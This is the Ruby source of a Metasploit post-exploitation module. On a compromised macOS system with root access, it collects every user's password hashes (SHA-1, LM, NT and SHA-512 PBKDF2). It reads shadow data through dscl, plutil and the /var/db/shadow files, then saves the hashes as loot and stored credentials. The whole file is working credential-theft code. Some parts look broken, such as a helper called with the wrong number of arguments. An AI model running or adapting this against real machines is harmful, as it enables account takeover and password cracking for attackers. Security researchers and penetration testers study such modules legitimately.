##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'rexml/document'

class Metasploit3 < Msf::Post
  # set of accounts to ignore while pilfering data
  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]

  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
        'Description'   => %q{
            This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
            versions 10.3 to 10.9.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>',
          'hammackj <jacob.hammack[at]hammackj.com>',
          'joev'
        ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))
    register_options([
      OptRegexp.new('MATCHUSER', [false,
        'Only attempt to grab hashes for users whose name matches this regex'
      ])
    ])
  end

  # Run Method for when run command is issued
  def run
    fail_with("Insufficient Privileges: must be running as root to dump the hashes") unless root?

    # build a single hash_file containing all users' hashes
    hash_file = ''

    # iterate over all users
    users.each do |user|
      next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
      print_status "Attempting to grab shadow for user #{user}..."
      if gt_lion? # 10.8+
        # pull the shadow from dscl
        shadow_bytes = grab_shadow_blob(user)
        next if shadow_bytes.blank?

        # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
        plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
        
        # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
        shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\" | plutil -convert xml1 - -o -'")
        
        # read the plaintext xml
        shadow_xml = REXML::Document.new(shadow_plist)
        
        # parse out the different parts of sha512pbkdf2
        dict = shadow_xml.elements[1].elements[1].elements[2]
        entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
        iterations = dict.elements[4].text.gsub(/\s+/, '')
        salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
        
        # PBKDF2 stored in <user, iterations, salt, entropy> format
        decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
        print_good "SHA512:#{decoded_hash}"
        hash_file << decoded_hash
      elsif lion? # 10.7
        # pull the shadow from dscl
        shadow_bytes = grab_shadow_blob(user)
        next if shadow_bytes.blank?

        # on 10.7 the ShadowHashData is stored in plaintext
        hash_decoded = shadow_bytes.upcase

        # Check if NT HASH is present
        if hash_decoded =~ /4F1010/
          report_nt_hash(hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0])
        end

        # slice out the sha512 hash + salt
        sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
        print_status("SHA512:#{user}:#{sha512}")
        hash_file << "#{user}:#{sha512}\n"
      else # 10.6 and below
        # On 10.6 and below, SHA-1 is used for encryption
        guid = if gte_leopard?
          cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
        elsif lte_tiger?
          cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
        end

        # Extract the hashes
        sha1_hash = read_file("/var/db/shadow/hash/#{guid} | cut -c169-216").chomp
        nt_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c1-32").chomp
        lm_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c33-64").chomp

        # Check that we have the hashes and save them
        if sha1_hash !~ /0000000000000000000000000/
          print_status("SHA1:#{user}:#{sha1_hash}")
          hash_file << "#{user}:#{sha1_hash}"
        end
        if nt_hash !~ /000000000000000/
          report_nt_hash(nt_hash)
        end
        if lm_hash !~ /0000000000000/
          print_status("LM:#{user}:#{lm_hash}")
          print_status("Credential saved in database.")
          report_auth_info(
            :host   => host,
            :port   => 445,
            :sname  => 'smb',
            :user   => user,
            :pass   => "#{lm_hash}:",
            :active => true
          )
        end
      end
    end
    # Save pwd file
    upassf = store_loot("osx.hashes.sha1", "text/plain", session, hash_file,
                        "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
    print_good("Unshadowed Password File: #{upassf}")
  end

  private

  # @return [Bool] system version is at least 10.5
  def gte_leopard?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
  end

  # @return [Bool] system version is at least 10.8
  def gt_lion?
    ver_num =~ /10\.(\d+)/ and $1.to_i >= 8
  end

  # @return [String] hostname
  def host; session.session_host; end

  # @return [Bool] system version is 10.7
  def lion?
    ver_num =~ /10\.(\d+)/ and $1.to_i == 7
  end

  # @return [Bool] system version is 10.4 or lower
  def lte_tiger?
    ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
  end
  
  # parse the dslocal plist in lion
  def read_ds_xml_plist(plist_content)
    doc  = REXML::Document.new(plist_content)
    keys = []
    doc.elements.each("plist/dict/key")  { |n| keys << n.text }

    fields = {}
    i = 0
    doc.elements.each("plist/dict/array") do |element|
      data = []
      fields[keys[i]] = data
      element.each_element("*") do |thing|
        data_set = thing.text
        if data_set
          data << data_set.gsub("\n\t\t","")
        else
          data << data_set
        end
      end
      i+=1
    end
    return fields
  end

  # reports the NT hash info to metasploit backend
  def report_nt_hash(nt_hash, user)
    return unless nt_hash.present?
    print_status("NT:#{user}:#{nt_hash}")
    print_status("Credential saved in database.")
    report_auth_info(
      :host   => host,
      :port   => 445,
      :sname  => 'smb',
      :user   => user,
      :pass   => "AAD3B435B51404EE:#{nt_hash}",
      :active => true
    )
  end

  # Checks if running as root on the target
  # @return [Bool] current user is root
  def root?
    whoami == 'root'
  end

  # @return [String] containing blob for ShadowHashData in user's plist
  # @return [nil] if shadow is invalid
  def grab_shadow_blob(user)
    shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
    return nil unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
    # strip the other bytes
    shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
  end

  # @return [Array<String>] list of user names
  def users
    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
  end

  # @return [String] version string (e.g. 10.8.5)
  def ver_num
    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
  end

  # @return [String] name of current user
  def whoami
    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
  end
end
